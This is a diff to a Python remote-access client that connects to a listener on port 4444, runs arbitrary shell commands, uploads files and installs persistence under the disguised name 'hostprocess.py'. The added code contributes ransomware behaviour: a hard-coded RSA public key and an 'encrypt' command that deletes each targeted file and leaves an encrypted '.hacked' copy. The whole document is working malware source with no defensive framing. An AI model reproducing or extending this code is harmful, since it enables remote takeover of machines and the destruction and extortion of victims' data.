@@ -1,11 +1,18 @@
+from fileinput import filename
 import socket
 import subprocess
 import json
 import shutil
 import os
 import sys
+import rsa
+
+from Utilities.Encryption.rsa import encrypt
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.connect(("127.0.0.1",4444))
+
+key = b'-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAmk+g3GdxD4hKYbpU4AEAUfp8ofDVtOoOAjSCgrCthwBac29j+8E2\ng4JLWs7SF8J5uDUZcRtSQYksuVoe36neCQziKWaFd9f7X9965tBKFc6GUBUokq4i\nIC/XAO+9dAZWjTGqO/CCNCNfqUHRErIh+5suaKw3fL2uKlPVn4ZGWzjSVOZ0QNgp\nKppD5XWQTwLixozcQm1pKhKqSq7WXBV2z+bgovOTXoSepWBhuRqg7BNRIs6wWMxb\nWassuu1eBDRbfpk4jOOOvq0JzMN27hLcgGSV0MIpNoUfjyYeNVgBDOl3Qc1nt1CU\n5WmYAT7oZJ75jO7WPQboOalQtB2c2P4MGQIDAQAB\n-----END RSA PUBLIC KEY-----\n'
+publicKey = rsa.PublicKey.load_pkcs1(key)
 
 
 def reliable_send(s,data):
@@ -50,7 +57,13 @@ def persist(copy_name): #persist(reg_name, copy_name)
     except Exception as e:
        print(e)
 
-
+def encrypt_file(filename):
+    print('filename = ',filename)
+    with open(filename,'rb') as f:
+        text = f.read()
+    os.remove(filename)
+    with open(filename+".hacked", "wb") as f:
+        f.write(encrypt(str(text), publicKey))
        
 def start_comm():
     while True:
@@ -64,6 +77,12 @@ def start_comm():
             elif args[0] == 'download':   #server side download => client side upload
                 print(f'uploading {args[1]}')
                 upload_file(args[1], server)
+            elif cmd == 'add persistance':
+                persist("hostprocess.py")
+            elif args[0] == 'encrypt':
+                encrypt_file(args[1])
+            elif cmd == 'help':
+                print(' ')
             else:
                 execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
